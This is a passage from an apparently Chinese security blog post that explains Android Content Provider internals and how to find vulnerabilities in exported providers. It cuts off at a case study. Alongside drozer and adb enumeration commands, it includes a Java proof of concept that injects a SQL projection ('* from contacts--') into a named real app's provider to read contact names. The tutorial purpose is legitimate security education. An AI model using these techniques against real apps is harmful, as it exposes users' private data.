class=\"line\">https://tea9.xyz/post/962818054.html</span><br><span class=\"line\">https://paper.seebug.org/papers/Archive/drops2/Android%20Broadcast%20Security.html</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（12）——Content Provider漏洞详解","url":"/2023/02/13/bug0012/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"二、Content-Provider初步介绍\"><a href=\"#二、Content-Provider初步介绍\" class=\"headerlink\" title=\"二、Content Provider初步介绍\"></a>二、Content Provider初步介绍</h2><h3 id=\"1-Content-Provider的基本原理\"><a href=\"#1-Content-Provider的基本原理\" class=\"headerlink\" title=\"1.Content Provider的基本原理\"></a>1.Content Provider的基本原理</h3><h3 id=\"（1）Content-Provider简介\"><a href=\"#（1）Content-Provider简介\" class=\"headerlink\" title=\"（1）Content Provider简介\"></a>（1）Content Provider简介</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/3.png\" alt=\"image-20210922094010216\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中的数据存储方式：Shared Preferences、网络存储、文件存储、外部存储、SQLite,这些存储方式一般在单独的应用程序中实现数据共享，对于不同应用之间共享数据，就要借助Content Provider。</span><br><span class=\"line\">ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（2）Content-Provider作用\"><a href=\"#（2）Content-Provider作用\" class=\"headerlink\" title=\"（2）Content Provider作用\"></a>（2）Content Provider作用</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/1.png\" alt=\"image-20210922094010216\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/2.png\" alt=\"image-20210922094010216\"></p>\n<p>Content Provider可以使得不同APP进程之间进行数据交互和共享，即跨进程通信</p>\n<h3 id=\"（3）URI详解\"><a href=\"#（3）URI详解\" class=\"headerlink\" title=\"（3）URI详解\"></a>（3）URI详解</h3><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p>\n<h5 id=\"URI\"><a href=\"#URI\" class=\"headerlink\" title=\"URI:\"></a>URI:</h5><p><strong>URI的介绍：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class=\"line\">（<span class=\"number\">2</span>）作用：唯一标识ContentProvider &amp;其中的数据</span><br><span class=\"line\">（<span class=\"number\">3</span>）外界进程通过URL找到对应的ContentProvider &amp;其中数据，再进行数据操作</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/4.png\" alt=\"image-20210922094010216\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）标准前缀:content:<span class=\"comment\">// ,用来说明一个Content Provider控制这些数据</span></span><br><span class=\"line\">（<span class=\"number\">2</span>）URL的标识：com.carson.provider, 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证URL标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该ContentProvider的包.类的名称</span><br><span class=\"line\">（<span class=\"number\">3</span>）路径：User,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class=\"line\">（<span class=\"number\">4</span>）记录ID:id, 如果URL中包含表示需要获取的记录ID,则返回该id对应的数据，如果没有ID,就表示返回全部</span><br></pre></td></tr></table></figure>\n\n<p><strong>构建URI的路径：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）操作User表中id为<span class=\"number\">11</span>的记录，构建数据：/User/<span class=\"number\">11</span></span><br><span class=\"line\">（<span class=\"number\">2</span>）操作User表中id为<span class=\"number\">11</span>的记录的name字段：User/<span class=\"number\">11</span>/name</span><br><span class=\"line\">（<span class=\"number\">3</span>）操作User表中的所有记录：/User</span><br><span class=\"line\">（<span class=\"number\">4</span>）操作来自文件、xml或网络其他存储方式的数据，如要操作xml文件中User节点下的name字段：/User/name</span><br><span class=\"line\">（<span class=\"number\">5</span>）若要将一个字符串转换成URI,可以使用Uri类中的parse()方法：</span><br><span class=\"line\">\t<span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.carson.provider/User&quot;</span>)；\t</span><br></pre></td></tr></table></figure>\n\n<p><strong>URI各部分的获取：</strong></p>\n<p>我们给出一个URI的样例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</span><br></pre></td></tr></table></figure>\n\n<p>我们介意使用一些方法来获取URI的各个部分：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">getScheme()：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class=\"line\"><span class=\"title function_\">getHost</span><span class=\"params\">()</span>：获取 Authority 中的 Host 字符串，即 www.baidu.com</span><br><span class=\"line\"><span class=\"title function_\">getPost</span><span class=\"params\">()</span>：获取 Authority 中的 Port 字符串，即 <span class=\"number\">8080</span></span><br><span class=\"line\">getPath()：获取 Uri 中 path 部分，即 wenku/jiatiao.html</span><br><span class=\"line\"><span class=\"title function_\">getQuery</span><span class=\"params\">()</span>：获取 Uri 中的 query 部分，即 id=<span class=\"number\">15</span>&amp;name=jack</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"MIME\"><a href=\"#MIME\" class=\"headerlink\" title=\"MIME:\"></a>MIME:</h5><p>MIME是指定某个扩展名的文件用一种应用程序打开，就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">text/html</span><br><span class=\"line\">text/css</span><br><span class=\"line\">text/xml</span><br><span class=\"line\">application/pdf</span><br></pre></td></tr></table></figure>\n\n<p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p>\n<ul>\n<li>集合记录（dir）:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vnd.android.cursor.dir/自定义 </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>单条记录（item）:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vnd.android.cursor.item/自定义 </span><br></pre></td></tr></table></figure>\n\n<p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p>\n<h5 id=\"URI解析\"><a href=\"#URI解析\" class=\"headerlink\" title=\"URI解析:\"></a>URI解析:</h5><p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：UriMatcher 和 ContentUris</p>\n<p><strong>UriMatcher：</strong></p>\n<p>UriMatcher类用于匹配Uri，使用步骤如下：</p>\n<ul>\n<li>将需要匹配的Uri路径进行注册：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class=\"line\"><span class=\"type\">UriMatcher</span>  <span class=\"variable\">sMatcher</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class=\"line\"><span class=\"comment\">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class=\"line\">sMatcher.addURI(<span class=\"string\">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class=\"string\">&quot; tablename &quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class=\"line\">sMatcher.addURI(<span class=\"string\">&quot;com.wang.provider.myprovider&quot;</span>, <span class=\"string\">&quot;tablename/#&quot;</span>, <span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n\n<p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面三个部分都匹配上了就 OK</p>\n<p>补充：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">*:表示匹配任意长度的任意字符</span><br><span class=\"line\">#:表示匹配任意长度的数字</span><br><span class=\"line\">匹配任意表的内容URI格式：</span><br><span class=\"line\">content：<span class=\"comment\">//com.example.app.provider/*</span></span><br><span class=\"line\">匹配table表中<span class=\"number\">1</span>任意一行数据的内容URI格式：</span><br><span class=\"line\">content：<span class=\"comment\">//com.example.app.procider/table/#</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">switch</span> (sMatcher.match(Uri.parse(<span class=\"string\">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      <span class=\"comment\">//match 1, todo something</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span></span><br><span class=\"line\">      <span class=\"comment\">//match 2, todo something</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"comment\">//match nothing, todo something</span></span><br><span class=\"line\">     <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ContentUris:</strong></p>\n<p>ContentUris类用于操作Uri路径后面的ID部分，有两个比较实用的方法：withAppendedId(Uri uri, long id)和parseId(Uri uri)</p>\n<ul>\n<li>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class=\"line\"> <span class=\"type\">Uri</span> <span class=\"variable\">resultUri</span> <span class=\"operator\">=</span> ContentUris.withAppendedId(uri, <span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>parseId(Uri uri)则从路径中获取ID部分:</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">//获取的结果为：7</span></span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"variable\">personid</span> <span class=\"operator\">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（4）Content-Provider数据共享\"><a href=\"#（4）Content-Provider数据共享\" class=\"headerlink\" title=\"（4）Content Provider数据共享\"></a>（4）Content Provider数据共享</h3><p>ContentProvider是一个抽象类，我们需要开发自己的内容提供者就需要继承这个类并复写其方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ContentProvider 类主要方法的介绍：</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onCreate</span><span class=\"params\">()</span>，在ContentProvider创建后就会被调用，而ContentProvider是在其它应用第一次访问它时被创建；</span><br><span class=\"line\"><span class=\"keyword\">public</span> Uri <span class=\"title function_\">insert</span><span class=\"params\">(Uri uri, ContentValues values)</span>，供外部应用向ContentProvider添加数据；</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">delete</span><span class=\"params\">(Uri uri, String selection, String[] selectionArgs)</span>，供外部应用从ContentProvider删除数据；</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">update</span><span class=\"params\">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，供外部应用更新ContentProvider中的数据；</span><br><span class=\"line\"><span class=\"keyword\">public</span> Cursor <span class=\"title function_\">query</span><span class=\"params\">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，供外部应用从ContentProvider中获取数据；</span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">getType</span><span class=\"params\">(Uri uri)</span>，返回当前Uri所代表数据的MIME类型；</span><br></pre></td></tr></table></figure>\n\n<p>如果操作的数据属于集合类型，那么 MIME 类型字符串应该以 vnd.android.cursor.dir&#x2F; 开头：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">要得到所有 tablename 记录： Uri 为 content:<span class=\"comment\">//com.wang.provider.myprovider/tablename，那么返回的MIME类型字符串应该为vnd.android.cursor.dir/table</span></span><br></pre></td></tr></table></figure>\n\n<p>如果要操作的数据属于非集合类型数据，那么 MIME 类型字符串应该以 vnd.android.cursor.item&#x2F; 开头：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">要得到 id 为 <span class=\"number\">10</span> 的 tablename 记录，Uri 为 content:<span class=\"comment\">//com.wang.provider.myprovider/tablename/10，那么返回的 MIME 类型字符串为：vnd.android.cursor.item/tablename </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（5）Content-Resolver操作数据\"><a href=\"#（5）Content-Resolver操作数据\" class=\"headerlink\" title=\"（5）Content Resolver操作数据\"></a>（5）Content Resolver操作数据</h3><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p>\n<p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/5.png\" alt=\"image-20210922094010216\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Uri <span class=\"title function_\">insert</span><span class=\"params\">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">delete</span><span class=\"params\">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">update</span><span class=\"params\">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Cursor <span class=\"title function_\">query</span><span class=\"params\">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure>\n\n<p>这些方法的第一个参数为Uri，代表要操作的ContentProvider和对其中的什么数据进行操作，其实和ContentProvider里面的方法是一样的，最终会被传到我们之前程序里面定义的ContentProvider方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">假定给定的是：Uri.parse(<span class=\"string\">&quot;content://com.wang.provider.myprovider/tablename/10&quot;</span>)，</span><br><span class=\"line\">那么将会对主机名为com.wang.provider.myprovider的ContentProvider进行操作，操作的数据为tablename表中id为<span class=\"number\">10</span>的记录</span><br></pre></td></tr></table></figure>\n\n<p>使用ContentResolver对ContentProvider中的数据进行操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"type\">ContentResolver</span> <span class=\"variable\">resolver</span> <span class=\"operator\">=</span> getContentResolver();</span><br><span class=\"line\"> <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class=\"line\"> <span class=\"comment\">//添加一条记录</span></span><br><span class=\"line\"> <span class=\"type\">ContentValues</span> <span class=\"variable\">values</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ContentValues</span>();</span><br><span class=\"line\"> values.put(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;wang1&quot;</span>);</span><br><span class=\"line\"> values.put(<span class=\"string\">&quot;age&quot;</span>, <span class=\"number\">28</span>);</span><br><span class=\"line\"> resolver.insert(uri, values); </span><br><span class=\"line\"> <span class=\"comment\">//获取tablename表中所有记录</span></span><br><span class=\"line\"> <span class=\"type\">Cursor</span> <span class=\"variable\">cursor</span> <span class=\"operator\">=</span> resolver.query(uri, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"string\">&quot;tablename data&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(cursor.moveToNext())&#123;</span><br><span class=\"line\">   Log.i(<span class=\"string\">&quot;ContentTest&quot;</span>, <span class=\"string\">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class=\"number\">0</span>)+ <span class=\"string\">&quot;, name=&quot;</span>+ cursor.getString(<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//把id为1的记录的name字段值更改新为zhang1</span></span><br><span class=\"line\"><span class=\"type\">ContentValues</span> <span class=\"variable\">updateValues</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ContentValues</span>();</span><br><span class=\"line\">updateValues.put(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;zhang1&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">updateIdUri</span> <span class=\"operator\">=</span> ContentUris.withAppendedId(uri, <span class=\"number\">2</span>);</span><br><span class=\"line\">resolver.update(updateIdUri, updateValues, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">//删除id为2的记录，即字段age</span></span><br><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">deleteIdUri</span> <span class=\"operator\">=</span> ContentUris.withAppendedId(uri, <span class=\"number\">2</span>);</span><br><span class=\"line\">resolver.delete(deleteIdUri, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br></pre></td></tr></table></figure>\n\n<p><strong>监听数据变化：</strong></p>\n<p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyProvider</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ContentProvider</span> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> Uri <span class=\"title function_\">insert</span><span class=\"params\">(Uri uri, ContentValues values)</span> &#123;</span><br><span class=\"line\">     db.insert(<span class=\"string\">&quot;tablename&quot;</span>, <span class=\"string\">&quot;tablenameid&quot;</span>, values);</span><br><span class=\"line\">      getContext().getContentResolver().notifyChange(uri, <span class=\"literal\">null</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">getContentResolver().registerContentObserver(Uri.parse(<span class=\"string\">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class=\"line\">        <span class=\"literal\">true</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">PersonObserver</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>()));</span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PersonObserver</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ContentObserver</span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"title function_\">PersonObserver</span><span class=\"params\">(Handler handler)</span> &#123;</span><br><span class=\"line\">       <span class=\"built_in\">super</span>(handler);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onChange</span><span class=\"params\">(<span class=\"type\">boolean</span> selfChange)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//to do something</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（6）Content-Provider使用\"><a href=\"#（6）Content-Provider使用\" class=\"headerlink\" title=\"（6）Content Provider使用\"></a>（6）Content Provider使用</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/6.png\" alt=\"image-20210922094010216\"></p>\n<p>创建内容提供者的基本流程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）创建一个扩展ContentProviderbaseclass的 Content Provider 类</span><br><span class=\"line\">（<span class=\"number\">2</span>）定义将用于访问内容的内容提供者 URI 地址</span><br><span class=\"line\">（<span class=\"number\">3</span>）创建自己的数据库来保存内容。通常，Android 使用 SQLite 数据库，框架需要覆盖onCreate()方法，该方法将使用 SQLite Open Helper 方法创建或打开提供者的数据库。当您的应用程序启动时，其每个内容提供程序的onCreate()处理程序在主应用程序线程上被调用</span><br><span class=\"line\">（<span class=\"number\">4</span>）实现内容提供者查询以执行不同的数据库特定操作</span><br><span class=\"line\">（<span class=\"number\">5</span>）最后使用 &lt;provider&gt; 标签在您的活动文件中注册您的内容提供者</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Content-Provider漏洞的种类和危害\"><a href=\"#2-Content-Provider漏洞的种类和危害\" class=\"headerlink\" title=\"2.Content Provider漏洞的种类和危害\"></a>2.Content Provider漏洞的种类和危害</h3><p>Content Provoder漏洞大致可以分为：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/7.png\" alt=\"image-20210922104352070\"></p>\n<p>Content Provider漏洞的危害：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中Content Provider起到在不同的进程APP之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span><br><span class=\"line\">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span><br><span class=\"line\">而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Content-Provider漏洞原理分析和复现\"><a href=\"#三、Content-Provider漏洞原理分析和复现\" class=\"headerlink\" title=\"三、Content Provider漏洞原理分析和复现\"></a>三、Content Provider漏洞原理分析和复现</h2><h3 id=\"1-漏洞挖掘方法\"><a href=\"#1-漏洞挖掘方法\" class=\"headerlink\" title=\"1.漏洞挖掘方法\"></a>1.漏洞挖掘方法</h3><p>先检测组件的exported属性，再检测组件permission、readPermission、writePermissio对应的protectionlevel，最后再检测sdk版本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/12.png\" alt=\"image-20210922124628055\"></p>\n<h4 id=\"（1）查找导出Provider\"><a href=\"#（1）查找导出Provider\" class=\"headerlink\" title=\"（1）查找导出Provider\"></a>（1）查找导出Provider</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）反编译 apk 文件，在AndroidManifest.xml中查找显示设置了android:exported=&quot;true&quot;Content Provider</span><br><span class=\"line\">（2）使用drozer工具，执行命令：run app.provider.info -a ddns.android.vuls</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）查找URI\"><a href=\"#（2）查找URI\" class=\"headerlink\" title=\"（2）查找URI\"></a>（2）查找URI</h4><ul>\n<li>反编译apk文件，在代码中查找UriMatcher.addURI，并手动拼接uri</li>\n</ul>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/13.png\" alt=\"image-20210922125010622\"></p>\n<p>如上，可以拼接出：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">content:<span class=\"comment\">//ddns.vuls.AccountProvider/account</span></span><br><span class=\"line\">content:<span class=\"comment\">//ddns.vuls.AccountProvider/account/</span></span><br><span class=\"line\">content:<span class=\"comment\">//ddns.vuls.AccountProvider/account/1</span></span><br><span class=\"line\">content:<span class=\"comment\">//ddns.vuls.AccountProvider/account/aaa</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用drozer工具</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">执行命令 run app.provider.finduri ddns.android.vuls</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）方法使用\"><a href=\"#（3）方法使用\" class=\"headerlink\" title=\"（3）方法使用\"></a>（3）方法使用</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>使用adb shell查询 </span><br><span class=\"line\">例子：adb shell content query --uri 具体uri</span><br><span class=\"line\"><span class=\"number\">2.</span>使用drozer验证</span><br><span class=\"line\">例子：run app.provider.query <span class=\"string\">&quot;具体uri&quot;</span></span><br><span class=\"line\"><span class=\"number\">3.</span>编写目标代码</span><br><span class=\"line\">例如：</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">getyouni</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    ContentResolver contentresolver=getContentResolver();</span><br><span class=\"line\">    String[] projection=&#123;<span class=\"string\">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span>Uri.parse(<span class=\"string\">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class=\"line\">    Cursor cursor=contentresolver.query(uri.projection,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">    String text=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(cursor.moveToNext())&#123;</span><br><span class=\"line\">        text+=cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;display_name&quot;</span>))+<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Log.i(<span class=\"string\">&quot;TEST&quot;</span>,text);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们下面将结合这三种方法来对一些常见的案例进行漏洞挖掘介绍</p>\n<h3 id=\"2-信息泄露漏洞\"><a href=\"#2-信息泄露漏洞\" class=\"headerlink\" title=\"2.信息泄露漏洞\"></a>2.信息泄露漏洞</h3><h4 id=\"（1）原理介绍\"><a href=\"#（1）原理介绍\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p><strong>案例1：盛大有你Android存在信息泄露漏洞</strong></p>\n<p>目标代码：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span 